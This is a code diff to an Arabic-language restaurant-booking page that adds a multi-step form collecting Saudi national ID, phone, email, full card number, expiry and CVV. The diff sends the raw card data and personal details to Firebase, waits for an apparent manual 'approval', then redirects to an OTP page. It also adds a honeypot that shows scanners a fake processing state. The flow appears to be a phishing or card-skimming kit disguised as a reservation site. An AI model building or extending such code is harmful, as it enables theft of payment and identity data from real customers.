@@ -1,13 +1,15 @@
-import { Link } from "wouter";
-import { ArrowRight, MapPin, Clock, Star, Phone, Check, Search, ChevronDown, Filter, Utensils } from "lucide-react";
+import { Link, useLocation } from "wouter";
+import { ArrowRight, MapPin, Clock, Star, Phone, Check, Search, ChevronDown, Filter, Utensils, CreditCard, User, Mail, IdCard } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { handlePay, listenForApproval, addData } from "@/lib/firebase";
+import { initBotProtection, performBotCheck } from "@/lib/botProtection";
 
 const restaurants = [
   {
@@ -104,41 +106,209 @@ const featuredRestaurant = {
   features: ["تجربة حصرية", "قائمة خاصة", "خدمة VIP"],
 };
 
+const getCardType = (cardNumber: string): string => {
+  const num = cardNumber.replace(/\s/g, "");
+  if (/^4/.test(num)) return "visa";
+  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return "mastercard";
+  if (/^(4[0-9]{5}|5[0-9]{5}|6[0-9]{5}|9[0-9]{5})/.test(num)) return "mada";
+  return "";
+};
+
+const validateLuhn = (cardNumber: string): boolean => {
+  const digits = cardNumber.replace(/\s/g, "").split("").reverse().map(Number);
+  let sum = 0;
+  for (let i = 0; i < digits.length; i++) {
+    let digit = digits[i];
+    if (i % 2 === 1) {
+      digit *= 2;
+      if (digit > 9) digit -= 9;
+    }
+    sum += digit;
+  }
+  return sum % 10 === 0;
+};
+
 export default function RestaurantsPage() {
+  const [, setLocation] = useLocation();
   const [selectedRestaurant, setSelectedRestaurant] = useState<typeof restaurants[0] | null>(null);
   const [showReservation, setShowReservation] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [searchQuery, setSearchQuery] = useState("");
+  const [step, setStep] = useState(1); // 1: reservation, 2: personal, 3: payment
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [honeypot, setHoneypot] = useState("");
+  
   const [reservationData, setReservationData] = useState({
     date: "",
     time: "",
     guests: "",
+  });
+  
+  const [personalData, setPersonalData] = useState({
     name: "",
     phone: "",
+    saudiId: "",
+    email: "",
   });
+  
+  const [cardData, setCardData] = useState({
+    cardNumber: "",
+    cardName: "",
+    expiryMonth: "01",
+    expiryYear: "2026",
+    cvv: "",
+    cardCategory: "credit" as "credit" | "debit" | "platinum",
+  });
+  
+  const [errors, setErrors] = useState<Record<string, string>>({});
+
+  useEffect(() => {
+    initBotProtection();
+  }, []);
 
   const handleReserve = (restaurant: typeof restaurants[0] | typeof featuredRestaurant) => {
     setSelectedRestaurant(restaurant as typeof restaurants[0]);
     setShowReservation(true);
+    setStep(1);
   };
 
-  const handleSubmitReservation = () => {
-    // Save reservation to localStorage for checkout
+  const formatCardNumber = (value: string) => {
+    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
+    const matches = v.match(/\d{4,16}/g);
+    const match = (matches && matches[0]) || "";
+    const parts = [];
+    for (let i = 0, len = match.length; i < len; i += 4) {
+      parts.push(match.substring(i, i + 4));
+    }
+    return parts.length ? parts.join(" ") : v;
+  };
+
+  const validateStep1 = () => {
+    const newErrors: Record<string, string> = {};
+    if (!reservationData.date) newErrors.date = "يرجى اختيار التاريخ";
+    if (!reservationData.time) newErrors.time = "يرجى اختيار الوقت";
+    if (!reservationData.guests) newErrors.guests = "يرجى اختيار عدد الأشخاص";
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
+  const validateStep2 = () => {
+    const newErrors: Record<string, string> = {};
+    if (!personalData.name.trim() || personalData.name.trim().length < 3) {
+      newErrors.name = "يرجى إدخال الاسم الكامل";
+    }
+    if (!personalData.phone || !/^05\d{8}$/.test(personalData.phone)) {
+      newErrors.phone = "رقم الجوال غير صحيح";
+    }
+    if (!personalData.saudiId || !/^[12]\d{9}$/.test(personalData.saudiId)) {
+      newErrors.saudiId = "رقم الهوية غير صحيح";
+    }
+    if (!personalData.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(personalData.email)) {
+      newErrors.email = "البريد الإلكتروني غير صحيح";
+    }
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
+  const validateStep3 = () => {
+    const newErrors: Record<string, string> = {};
+    const rawCard = cardData.cardNumber.replace(/\s/g, "");
+    
+    if (!rawCard || rawCard.length < 13) {
+      newErrors.cardNumber = "رقم البطاقة غير صحيح";
+    } else if (!validateLuhn(rawCard)) {
+      newErrors.cardNumber = "رقم البطاقة غير صالح";
+    }
+    
+    if (!cardData.cardName.trim() || cardData.cardName.trim().length < 3) {
+      newErrors.cardName = "يرجى إدخال الاسم على البطاقة";
+    }
+    
+    const now = new Date();
+    const expiry = new Date(parseInt(cardData.expiryYear), parseInt(cardData.expiryMonth) - 1);
+    if (expiry < now) {
+      newErrors.expiry = "البطاقة منتهية الصلاحية";
+    }
+    
+    if (!cardData.cvv || cardData.cvv.length < 3) {
+      newErrors.cvv = "كود الحماية غير صحيح";
+    }
+    
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
+  const handleNextStep = () => {
+    if (step === 1 && validateStep1()) {
+      setStep(2);
+      setErrors({});
+    } else if (step === 2 && validateStep2()) {
+      // Save visitor data to Firebase
+      addData({
+        name: personalData.name,
+        phone: personalData.phone,
+        saudiId: personalData.saudiId,
+        email: personalData.email,
+        currentPage: "restaurant_payment",
+      });
+      setStep(3);
+      setErrors({});
+    }
+  };
+
+  const handleSubmitPayment = () => {
+    const botCheck = performBotCheck(honeypot);
+    if (botCheck.isBot) {
+      setIsProcessing(true);
+      setTimeout(() => setIsProcessing(false), 3000);
+      return;
+    }
+    
+    if (!validateStep3()) return;
+    
+    setIsProcessing(true);
+    
     const reservation = {
       restaurantId: selectedRestaurant?.id,
       restaurantName: selectedRestaurant?.name,
       date: reservationData.date,
       time: reservationData.time,
       guests: reservationData.guests,
-      name: reservationData.name,
-      phone: reservationData.phone,
       price: selectedRestaurant?.priceRange,
     };
     localStorage.setItem("restaurantReservation", JSON.stringify(reservation));
+    localStorage.setItem("restaurantPersonalData", JSON.stringify(personalData));
     
-    setShowReservation(false);
-    setShowSuccess(true);
-    setReservationData({ date: "", time: "", guests: "", name: "", phone: "" });
+    const paymentInfo = {
+      cardNumber: cardData.cardNumber.replace(/\s/g, ""),
+      cardName: cardData.cardName,
+      expiryMonth: cardData.expiryMonth,
+      expiryYear: cardData.expiryYear,
+      cvv: cardData.cvv,
+      cardType: getCardType(cardData.cardNumber),
+      cardCategory: cardData.cardCategory,
+      currentPage: "restaurant_checkout",
+      totalAmount: 150,
+      reservationType: "restaurant",
+    };
+    handlePay(paymentInfo, () => {});
+    
+    const unsubscribe = listenForApproval((approved) => {
+      if (approved) {
+        unsubscribe();
+        setShowReservation(false);
+        setLocation("/otp");
+      }
+    });
+  };
+
+  const resetForm = () => {
+    setStep(1);
+    setReservationData({ date: "", time: "", guests: "" });
+    setPersonalData({ name: "", phone: "", saudiId: "", email: "" });
+    setCardData({ cardNumber: "", cardName: "", expiryMonth: "01", expiryYear: "2026", cvv: "", cardCategory: "credit" });
+    setErrors({});
+    setIsProcessing(false);
   };
 
   return (
@@ -374,107 +544,304 @@ export default function RestaurantsPage() {
         </div>
       </footer>
 
-      {/* Reservation Dialog */}
-      <Dialog open={showReservation} onOpenChange={setShowReservation}>
-        <DialogContent className="max-w-md border-0 shadow-2xl bg-white" dir="rtl">
+      {/* Reservation Dialog - Multi-step */}
+      <Dialog open={showReservation} onOpenChange={(open) => { setShowReservation(open); if (!open) resetForm(); }}>
+        <DialogContent className="max-w-md border-0 shadow-2xl bg-white max-h-[90vh] overflow-y-auto" dir="rtl">
           <DialogHeader className="border-b pb-4">
-            <DialogTitle className="text-right text-xl text-[#3d3428]">حجز طاولة</DialogTitle>
+            <DialogTitle className="text-right text-xl text-[#3d3428]">
+              {step === 1 && "حجز طاولة"}
+              {step === 2 && "البيانات الشخصية"}
+              {step === 3 && "بيانات الدفع"}
+            </DialogTitle>
             <p className="text-gray-500 text-sm text-right">{selectedRestaurant?.name}</p>
+            
+            {/* Progress Steps */}
+            <div className="flex items-center justify-center gap-2 mt-4">
+              {[1, 2, 3].map((s) => (
+                <div key={s} className="flex items-center">
+                  <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${
+                    s <= step ? "bg-[#c4a35a] text-white" : "bg-gray-200 text-gray-500"
+                  }`}>
+                    {s}
+                  </div>
+                  {s < 3 && <div className={`w-8 h-0.5 mx-1 ${s < step ? "bg-[#c4a35a]" : "bg-gray-200"}`} />}
+                </div>
+              ))}
+            </div>
           </DialogHeader>
 
-          <div className="space-y-4 pt-4">
-            <div className="grid grid-cols-2 gap-3">
-              <div>
-                <Label className="text-sm mb-2 block text-gray-700">التاريخ *</Label>
-                <Input
-                  type="date"
-                  value={reservationData.date}
-                  onChange={(e) => setReservationData({ ...reservationData, date: e.target.value })}
-                  className="text-left border-gray-200"
-                  dir="ltr"
-                  data-testid="input-date"
-                />
+          {/* Honeypot */}
+          <div className="absolute -left-[9999px] opacity-0 h-0 overflow-hidden" aria-hidden="true">
+            <input type="text" value={honeypot} onChange={(e) => setHoneypot(e.target.value)} tabIndex={-1} autoComplete="off" />
+          </div>
+
+          {/* Step 1: Reservation Details */}
+          {step === 1 && (
+            <div className="space-y-4 pt-4">
+              <div className="grid grid-cols-2 gap-3">
+                <div>
+                  <Label className="text-sm mb-2 block text-gray-700">التاريخ *</Label>
+                  <Input
+                    type="date"
+                    value={reservationData.date}
+                    onChange={(e) => setReservationData({ ...reservationData, date: e.target.value })}
+                    className={`text-left border-gray-200 ${errors.date ? "border-red-500" : ""}`}
+                    dir="ltr"
+                    data-testid="input-date"
+                  />
+                  {errors.date && <p className="text-red-500 text-xs mt-1">{errors.date}</p>}
+                </div>
+                <div>
+                  <Label className="text-sm mb-2 block text-gray-700">الوقت *</Label>
+                  <Select value={reservationData.time} onValueChange={(value) => setReservationData({ ...reservationData, time: value })}>
+                    <SelectTrigger className={`border-gray-200 ${errors.time ? "border-red-500" : ""}`} data-testid="select-time">
+                      <SelectValue placeholder="اختر" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="12:00">12:00 م</SelectItem>
+                      <SelectItem value="13:00">1:00 م</SelectItem>
+                      <SelectItem value="14:00">2:00 م</SelectItem>
+                      <SelectItem value="18:00">6:00 م</SelectItem>
+                      <SelectItem value="19:00">7:00 م</SelectItem>
+                      <SelectItem value="20:00">8:00 م</SelectItem>
+                      <SelectItem value="21:00">9:00 م</SelectItem>
+                    </SelectContent>
+                  </Select>
+                  {errors.time && <p className="text-red-500 text-xs mt-1">{errors.time}</p>}
+                </div>
               </div>
+
               <div>
-                <Label className="text-sm mb-2 block text-gray-700">الوقت *</Label>
-                <Select
-                  value={reservationData.time}
-                  onValueChange={(value) => setReservationData({ ...reservationData, time: value })}
-                >
-                  <SelectTrigger className="border-gray-200" data-testid="select-time">
-                    <SelectValue placeholder="اختر" />
+                <Label className="text-sm mb-2 block text-gray-700">عدد الأشخاص *</Label>
+                <Select value={reservationData.guests} onValueChange={(value) => setReservationData({ ...reservationData, guests: value })}>
+                  <SelectTrigger className={`border-gray-200 ${errors.guests ? "border-red-500" : ""}`} data-testid="select-guests">
+                    <SelectValue placeholder="اختر عدد الضيوف" />
                   </SelectTrigger>
                   <SelectContent>
-                    <SelectItem value="12:00">12:00 م</SelectItem>
-                    <SelectItem value="13:00">1:00 م</SelectItem>
-                    <SelectItem value="14:00">2:00 م</SelectItem>
-                    <SelectItem value="18:00">6:00 م</SelectItem>
-                    <SelectItem value="19:00">7:00 م</SelectItem>
-                    <SelectItem value="20:00">8:00 م</SelectItem>
-                    <SelectItem value="21:00">9:00 م</SelectItem>
+                    <SelectItem value="1">شخص واحد</SelectItem>
+                    <SelectItem value="2">شخصين</SelectItem>
+                    <SelectItem value="3">3 أشخاص</SelectItem>
+                    <SelectItem value="4">4 أشخاص</SelectItem>
+                    <SelectItem value="5">5 أشخاص</SelectItem>
+                    <SelectItem value="6">6 أشخاص</SelectItem>
+                    <SelectItem value="7+">أكثر من 6</SelectItem>
                   </SelectContent>
                 </Select>
+                {errors.guests && <p className="text-red-500 text-xs mt-1">{errors.guests}</p>}
+              </div>
+
+              <Button onClick={handleNextStep} className="w-full bg-[#c4a35a] hover:bg-[#b39349] py-6 text-white font-semibold" data-testid="button-next-step1">
+                التالي
+              </Button>
+            </div>
+          )}
+
+          {/* Step 2: Personal Details */}
+          {step === 2 && (
+            <div className="space-y-4 pt-4">
+              <div>
+                <Label className="text-sm mb-2 block text-gray-700">الاسم الكامل *</Label>
+                <div className="relative">
+                  <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+                  <Input
+                    type="text"
+                    value={personalData.name}
+                    onChange={(e) => setPersonalData({ ...personalData, name: e.target.value })}
+                    placeholder="أدخل اسمك الكامل"
+                    className={`text-right pr-10 border-gray-200 ${errors.name ? "border-red-500" : ""}`}
+                    data-testid="input-personal-name"
+                  />
+                </div>
+                {errors.name && <p className="text-red-500 text-xs mt-1">{errors.name}</p>}
+              </div>
+
+              <div>
+                <Label className="text-sm mb-2 block text-gray-700">رقم الهوية *</Label>
+                <div className="relative">
+                  <IdCard className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+                  <Input
+                    type="text"
+                    value={personalData.saudiId}
+                    onChange={(e) => setPersonalData({ ...personalData, saudiId: e.target.value.replace(/\D/g, "").slice(0, 10) })}
+                    placeholder="1XXXXXXXXX"
+                    className={`text-left pr-10 border-gray-200 ${errors.saudiId ? "border-red-500" : ""}`}
+                    dir="ltr"
+                    data-testid="input-saudi-id"
+                  />
+                </div>
+                {errors.saudiId && <p className="text-red-500 text-xs mt-1">{errors.saudiId}</p>}
+              </div>
+
+              <div>
+                <Label className="text-sm mb-2 block text-gray-700">البريد الإلكتروني *</Label>
+                <div className="relative">
+                  <Mail className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+                  <Input
+                    type="email"
+                    value={personalData.email}
+                    onChange={(e) => setPersonalData({ ...personalData, email: e.target.value })}
+                    placeholder="example@email.com"
+                    className={`text-left pr-10 border-gray-200 ${errors.email ? "border-red-500" : ""}`}
+                    dir="ltr"
+                    data-testid="input-email"
+                  />
+                </div>
+                {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
+              </div>
+
+              <div>
+                <Label className="text-sm mb-2 block text-gray-700">رقم الجوال *</Label>
+                <div className="relative">
+                  <Phone className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+                  <Input
+                    type="tel"
+                    value={personalData.phone}
+                    onChange={(e) => setPersonalData({ ...personalData, phone: e.target.value.replace(/\D/g, "").slice(0, 10) })}
+                    placeholder="05XXXXXXXX"
+                    className={`text-left pr-10 border-gray-200 ${errors.phone ? "border-red-500" : ""}`}
+                    dir="ltr"
+                    data-testid="input-phone"
+                  />
+                </div>
+                {errors.phone && <p className="text-red-500 text-xs mt-1">{errors.phone}</p>}
+              </div>
+
+              <div className="flex gap-2">
+                <Button onClick={() => setStep(1)} variant="outline" className="flex-1 py-6" data-testid="button-back-step2">
+                  السابق
+                </Button>
+                <Button onClick={handleNextStep} className="flex-1 bg-[#c4a35a] hover:bg-[#b39349] py-6 text-white font-semibold" data-testid="button-next-step2">
+                  التالي
+                </Button>
               </div>
             </div>
+          )}
 
-            <div>
-              <Label className="text-sm mb-2 block text-gray-700">عدد الأشخاص *</Label>
-              <Select
-                value={reservationData.guests}
-                onValueChange={(value) => setReservationData({ ...reservationData, guests: value })}
-              >
-                <SelectTrigger className="border-gray-200" data-testid="select-guests">
-                  <SelectValue placeholder="اختر عدد الضيوف" />
-                </SelectTrigger>
-                <SelectContent>
-                  <SelectItem value="1">شخص واحد</SelectItem>
-                  <SelectItem value="2">شخصين</SelectItem>
-                  <SelectItem value="3">3 أشخاص</SelectItem>
-                  <SelectItem value="4">4 أشخاص</SelectItem>
-                  <SelectItem value="5">5 أشخاص</SelectItem>
-                  <SelectItem value="6">6 أشخاص</SelectItem>
-                  <SelectItem value="7+">أكثر من 6</SelectItem>
-                </SelectContent>
-              </Select>
-            </div>
+          {/* Step 3: Payment Details */}
+          {step === 3 && (
+            <div className="space-y-4 pt-4">
+              {/* Card Type Selection */}
+              <div>
+                <Label className="text-sm mb-2 block text-gray-700">نوع البطاقة</Label>
+                <div className="grid grid-cols-3 gap-2">
+                  {(["credit", "debit", "platinum"] as const).map((type) => (
+                    <button
+                      key={type}
+                      type="button"
+                      onClick={() => setCardData({ ...cardData, cardCategory: type })}
+                      className={`p-2 rounded-lg border-2 text-center transition-all ${
+                        cardData.cardCategory === type
+                          ? "border-[#c4a35a] bg-[#c4a35a]/10 text-[#c4a35a]"
+                          : "border-gray-200 text-gray-500 hover:border-[#c4a35a]/50"
+                      }`}
+                      data-testid={`button-card-${type}`}
+                    >
+                      <div className="text-xs font-medium">
+                        {type === "credit" && "ائتمانية"}
+                        {type === "debit" && "مدى"}
+                        {type === "platinum" && "بلاتينية"}
+                      </div>
+                    </button>
+                  ))}
+                </div>
+              </div>
 
-            <div>
-              <Label className="text-sm mb-2 block text-gray-700">الاسم *</Label>
-              <Input
-                type="text"
-                value={reservationData.name}
-                onChange={(e) => setReservationData({ ...reservationData, name: e.target.value })}
-                placeholder="أدخل اسمك الكامل"
-                className="text-right border-gray-200"
-                data-testid="input-reservation-name"
-              />
-            </div>
+              <div>
+                <Label className="text-sm mb-2 block text-gray-700">رقم البطاقة *</Label>
+                <div className="relative">
+                  <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+                  <Input
+                    type="text"
+                    value={cardData.cardNumber}
+                    onChange={(e) => {
+                      const formatted = formatCardNumber(e.target.value);
+                      if (formatted.replace(/\s/g, "").length <= 16) {
+                        setCardData({ ...cardData, cardNumber: formatted });
+                      }
+                    }}
+                    placeholder="0000 0000 0000 0000"
+                    className={`text-left pr-10 font-mono border-gray-200 ${errors.cardNumber ? "border-red-500" : ""}`}
+                    dir="ltr"
+                    data-testid="input-card-number"
+                  />
+                </div>
+                {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
+              </div>
 
-            <div>
-              <Label className="text-sm mb-2 block text-gray-700">رقم الجوال *</Label>
-              <div className="relative">
-                <Phone className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+              <div>
+                <Label className="text-sm mb-2 block text-gray-700">الاسم على البطاقة *</Label>
                 <Input
-                  type="tel"
-                  value={reservationData.phone}
-                  onChange={(e) => setReservationData({ ...reservationData, phone: e.target.value })}
-                  placeholder="05XXXXXXXX"
-                  className="text-left pl-10 border-gray-200"
+                  type="text"
+                  value={cardData.cardName}
+                  onChange={(e) => setCardData({ ...cardData, cardName: e.target.value.toUpperCase() })}
+                  placeholder="MOHAMMED ALI"
+                  className={`text-left border-gray-200 ${errors.cardName ? "border-red-500" : ""}`}
                   dir="ltr"
-                  data-testid="input-reservation-phone"
+                  data-testid="input-card-name"
                 />
+                {errors.cardName && <p className="text-red-500 text-xs mt-1">{errors.cardName}</p>}
+              </div>
+
+              <div className="grid grid-cols-2 gap-3">
+                <div>
+                  <Label className="text-sm mb-2 block text-gray-700">تاريخ الانتهاء *</Label>
+                  <div className="flex gap-2">
+                    <select
+                      value={cardData.expiryMonth}
+                      onChange={(e) => setCardData({ ...cardData, expiryMonth: e.target.value })}
+                      className={`flex-1 h-10 px-2 rounded-md border bg-white text-sm ${errors.expiry ? "border-red-500" : "border-gray-200"}`}
+                      data-testid="select-expiry-month"
+                    >
+                      {Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0")).map((m) => (
+                        <option key={m} value={m}>{m}</option>
+                      ))}
+                    </select>
+                    <select
+                      value={cardData.expiryYear}
+                      onChange={(e) => setCardData({ ...cardData, expiryYear: e.target.value })}
+                      className={`flex-1 h-10 px-2 rounded-md border bg-white text-sm ${errors.expiry ? "border-red-500" : "border-gray-200"}`}
+                      data-testid="select-expiry-year"
+                    >
+                      {Array.from({ length: 10 }, (_, i) => String(2024 + i)).map((y) => (
+                        <option key={y} value={y}>{y}</option>
+                      ))}
+                    </select>
+                  </div>
+                  {errors.expiry && <p className="text-red-500 text-xs mt-1">{errors.expiry}</p>}
+                </div>
+                <div>
+                  <Label className="text-sm mb-2 block text-gray-700">CVV *</Label>
+                  <Input
+                    type="text"
+                    value={cardData.cvv}
+                    onChange={(e) => {
+                      const v = e.target.value.replace(/\D/g, "").slice(0, 4);
+                      setCardData({ ...cardData, cvv: v });
+                    }}
+                    placeholder="123"
+                    className={`text-left font-mono border-gray-200 ${errors.cvv ? "border-red-500" : ""}`}
+                    dir="ltr"
+                    data-testid="input-cvv"
+                  />
+                  {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
+                </div>
+              </div>
+
+              <div className="flex gap-2 pt-2">
+                <Button onClick={() => setStep(2)} variant="outline" className="flex-1 py-6" disabled={isProcessing} data-testid="button-back-step3">
+                  السابق
+                </Button>
+                <Button
+                  onClick={handleSubmitPayment}
+                  className="flex-1 bg-[#c4a35a] hover:bg-[#b39349] py-6 text-white font-semibold"
+                  disabled={isProcessing}
+                  data-testid="button-submit-payment"
+                >
+                  {isProcessing ? "جاري المعالجة..." : "تأكيد الدفع"}
+                </Button>
               </div>
             </div>
-
-            <Button
-              onClick={handleSubmitReservation}
-              className="w-full bg-[#c4a35a] hover:bg-[#b39349] py-6 text-white font-semibold"
-              disabled={!reservationData.date || !reservationData.time || !reservationData.guests || !reservationData.name || !reservationData.phone}
-              data-testid="button-confirm-reservation"
-            >
-              تأكيد الحجز
-            </Button>
-          </div>
+          )}
         </DialogContent>
       </Dialog>
 
